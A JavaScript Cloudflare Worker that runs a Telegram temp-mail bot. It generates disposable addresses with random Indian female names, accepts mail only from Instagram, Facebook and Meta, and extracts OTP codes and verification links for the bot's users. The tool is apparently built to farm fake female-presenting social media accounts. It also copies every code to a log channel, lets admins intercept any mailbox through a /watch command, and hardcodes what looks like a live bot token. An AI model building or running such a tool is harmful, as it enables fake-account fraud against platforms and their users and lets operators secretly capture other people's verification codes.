/**
 * Ultra Fast Step-by-Step Temp Mail Engine
 * Domain: vibepulsemedia.online
 */

const BOT_TOKEN = "8943075720:AAE4URhun0DS0yc38zUsHr1J2tGO3Kih3cA";
let PRIMARY_OWNER_ID = "8452322818";
const DB_CHANNEL_ID = "-1004474665956";
const DOMAIN = "vibepulsemedia.online";

let ADMINS = new Set([PRIMARY_OWNER_ID.toString()]);
let ADMIN_WATCHED_EMAILS = new Map();

// Strict Meta & Instagram Filter
const ALLOWED_SENDERS = [
  "instagram.com",
  "mail.instagram.com",
  "facebookmail.com",
  "meta.com",
  "support.facebook.com",
  "meta.ai"
];

// Optimized Female Names Pool
const FEMALE_NAMES = [
  "priya", "ananya", "sneha", "pooja", "neha", "riya", "simran", "kajal",
  "khushi", "aditi", "shreya", "tanvi", "mansi", "divya", "muskan", "aarushi",
  "ishika", "sakshi", "pallavi", "swati", "anjali", "kriti", "megha", "komal",
  "sonam", "preeti", "jyoti", "rekha", "payal", "varsha", "shikha", "nisha",
  "tanya", "deepika", "radhika", "monika", "garima", "ekta", "kavita", "saloni"
];

const SURNAMES = [
  "sharma", "verma", "singh", "patel", "kumar", "yadav", "gupta", "mishra",
  "tiwari", "pandey", "chauhan", "joshi", "jha", "mehta", "das", "dubey",
  "sen", "bose", "roy", "nair", "reddy", "kashyap", "bhardwaj", "saxena"
];

export default {
  // --- 1. WEBHOOK DISPATCHER ---
  async fetch(request, env, ctx) {
    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();
      if (update.message) {
        ctx.waitUntil(handleMessage(update.message));
      } else if (update.callback_query) {
        ctx.waitUntil(handleCallback(update.callback_query));
      }
      return new Response("OK", { status: 200 });
    } catch (err) {
      return new Response("Error: " + err.message, { status: 500 });
    }
  },

  // --- 2. EMAIL ROUTING (OTP EXTRACTION) ---
  async email(message, env, ctx) {
    try {
      const fromEmail = (message.from || "").toLowerCase().trim();
      const toEmail = (message.to || "").toLowerCase().trim();

      // Only Meta / Instagram allowed
      const isAllowed = ALLOWED_SENDERS.some(d => fromEmail.endsWith(d) || fromEmail.includes(d));
      if (!isAllowed) return;

      const rawStream = message.raw;
      const reader = rawStream.getReader();
      let rawContent = "";
      const decoder = new TextDecoder("utf-8");

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        rawContent += decoder.decode(value, { stream: true });
      }

      const cleanBody = parseEmailContent(rawContent);

      // Fast OTP Match (6 digits)
      const otpRegex = /(?:code|otp|pin|security|passcode)[\s:=–-]{1,6}(\b\d{6}\b)/i;
      const otpMatch = cleanBody.match(otpRegex) || cleanBody.match(/\b\d{6}\b/);
      const extractedOtp = otpMatch ? (otpMatch[1] || otpMatch[0]) : null;

      // Link match
      const linkRegex = /(https?:\/\/[^\s<>"{}|\\^`]+(?:instagram\.com|facebook\.com|meta\.com)[^\s<>"{}|\\^`]*)/i;
      const linkMatch = cleanBody.match(linkRegex);
      const verifyLink = linkMatch ? linkMatch[0] : null;

      const localPart = toEmail.split("@")[0];
      let targetChatId = null;
      let isSystemMail = false;

      if (ADMIN_WATCHED_EMAILS.has(toEmail)) {
        targetChatId = ADMIN_WATCHED_EMAILS.get(toEmail);
        isSystemMail = true;
      } else if (localPart.includes("x")) {
        const potentialId = localPart.split("x")[0];
        if (/^\d+$/.test(potentialId)) targetChatId = potentialId;
      }

      if (!targetChatId) isSystemMail = true;

      // Pure isolated OTP delivery
      if (isSystemMail) {
        for (const adminId of ADMINS) {
          await deliverOtpMessage(adminId, extractedOtp, toEmail, verifyLink);
        }
      } else if (targetChatId) {
        await deliverOtpMessage(targetChatId, extractedOtp, toEmail, verifyLink);
      }

      // Log Channel
      if (DB_CHANNEL_ID) {
        await callTelegram("sendMessage", {
          chat_id: DB_CHANNEL_ID,
          text: `Log: \`${toEmail}\` | Code: \`${extractedOtp || "Link"}\``,
          parse_mode: "Markdown"
        });
      }
    } catch (e) {
      console.error("Email Error: " + e.message);
    }
  }
};

// Pure Single-Tap Copy OTP Message
async function deliverOtpMessage(chatId, otp, toEmail, link) {
  let text = "";
  if (otp) {
    text = `\`${otp}\`\n\n_${toEmail}_`;
  } else {
    text = `Link Received\n_${toEmail}_`;
  }

  let buttons = [];
  if (link) {
    buttons.push([{ text: "🔗 Open Link", url: link }]);
  }
  buttons.push([{ text: "🔄 Change Email", callback_data: "action_generate" }]);

  await callTelegram("sendMessage", {
    chat_id: chatId,
    text: text,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: buttons }
  });
}

// Telegram Message Router
async function handleMessage(msg) {
  const chatId = msg.chat.id.toString();
  const text = (msg.text || "").trim();
  const isOwner = (chatId === PRIMARY_OWNER_ID.toString());
  const isAdmin = ADMINS.has(chatId) || isOwner;

  // Master Authority Commands
  if (text.startsWith("/transferowner") && isOwner) {
    const target = text.split(" ")[1];
    if (target && /^\d+$/.test(target)) {
      PRIMARY_OWNER_ID = target.trim();
      ADMINS.add(target.trim());
      await callTelegram("sendMessage", { chat_id: chatId, text: `👑 Owner set to: \`${target}\``, parse_mode: "Markdown" });
    }
    return;
  }

  if (text.startsWith("/addadmin") && isOwner) {
    const target = text.split(" ")[1];
    if (target && /^\d+$/.test(target)) {
      ADMINS.add(target.trim());
      await callTelegram("sendMessage", { chat_id: chatId, text: `✅ Added: \`${target}\``, parse_mode: "Markdown" });
    }
    return;
  }

  if (text.startsWith("/watch") && isAdmin) {
    const target = text.split(" ")[1];
    if (target && target.includes("@")) {
      ADMIN_WATCHED_EMAILS.set(target.toLowerCase().trim(), chatId);
      await callTelegram("sendMessage", { chat_id: chatId, text: `🎯 Watching: \`${target.toLowerCase().trim()}\``, parse_mode: "Markdown" });
    }
    return;
  }

  // STEP 1: /start karne par seedhe portal menu aayega (Email abhi generate nahi hoga)
  if (text === "/start") {
    let buttons = [
      [{ text: "⚡ Generate Email", callback_data: "action_generate" }]
    ];
    if (isAdmin) {
      buttons.push([{ text: "🔑 Old Email Hub", callback_data: "admin_old_mails" }]);
    }

    await callTelegram("sendMessage", {
      chat_id: chatId,
      text: "⚡ *Meta & Instagram Temp Mail*\n\nNiche button par tap karke instant email generate karein:",
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
  // Agar koi command se /gen kare toh direct email
  else if (text === "/gen") {
    await sendPureEmailCard(chatId, false, null, isAdmin);
  }
  else if (text === "/id") {
    await callTelegram("sendMessage", { chat_id: chatId, text: `\`${chatId}\``, parse_mode: "Markdown" });
  }
}

// STEP 2 & 3: Fast Inline Button Clicks
async function handleCallback(query) {
  const chatId = query.message.chat.id.toString();
  const messageId = query.message.message_id;
  const data = query.data;
  const isOwner = (chatId === PRIMARY_OWNER_ID.toString());
  const isAdmin = ADMINS.has(chatId) || isOwner;

  // Turant answer karo taaki Telegram par button instant unlock ho
  await callTelegram("answerCallbackQuery", { callback_query_id: query.id });

  if (data === "action_generate") {
    // Ultra fast in-place text update
    await sendPureEmailCard(chatId, true, messageId, isAdmin);
  } 
  else if (data === "admin_old_mails" && isAdmin) {
    const info = `Old Email Monitor:\n\`/watch name@${DOMAIN}\``;
    const btns = [[{ text: "🔙 Back", callback_data: "action_generate" }]];
    await callTelegram("editMessageText", {
      chat_id: chatId,
      message_id: messageId,
      text: info,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: btns }
    });
  }
}

// PURE EMAIL CARD: Screen par sirf aur sirf Email text rahega (100% pure tap-to-copy)
async function sendPureEmailCard(chatId, isEdit = false, messageId = null, isAdmin = false) {
  const email = generateFastFemaleEmail(chatId);
  const text = `\`${email}\``;

  let buttons = [
    [{ text: "🔄 Change Email", callback_data: "action_generate" }]
  ];

  if (isAdmin) {
    buttons.push([{ text: "🔑 Old Email Hub", callback_data: "admin_old_mails" }]);
  }

  if (isEdit && messageId) {
    await callTelegram("editMessageText", {
      chat_id: chatId,
      message_id: messageId,
      text: text,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  } else {
    await callTelegram("sendMessage", {
      chat_id: chatId,
      text: text,
      parse_mode: "Markdown",
      reply_markup: { inline_keyboard: buttons }
    });
  }
}

// Ultra Fast Female Email Generator
function generateFastFemaleEmail(chatId) {
  const first = FEMALE_NAMES[(Math.random() * FEMALE_NAMES.length) | 0];
  const last = SURNAMES[(Math.random() * SURNAMES.length) | 0];
  const num = ((Math.random() * 9000) | 0) + 1000;
  const sep = Math.random() > 0.5 ? "." : "";
  return `${chatId}x${first}${sep}${last}${num}@${DOMAIN}`;
}

function parseEmailContent(raw) {
  const parts = raw.split(/\r?\n\r?\n/);
  let text = parts.slice(1).join("\n\n");
  text = text.replace(/<style[^>]*>[\s\S]*?<\/style>/gi, "");
  text = text.replace(/<script[^>]*>[\s\S]*?<\/script>/gi, "");
  text = text.replace(/<[^>]+>/g, " ");
  text = text.replace(/&nbsp;/g, " ");
  text = text.replace(/&amp;/g, "&");
  text = text.replace(/&quot;/g, '"');
  text = text.replace(/&lt;/g, "<");
  text = text.replace(/&gt;/g, ">");
  text = text.replace(/=\r?\n/g, "");
  text = text.replace(/\s{2,}/g, " ").trim();
  return text;
}

async function callTelegram(method, payload) {
  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload)
  });
}
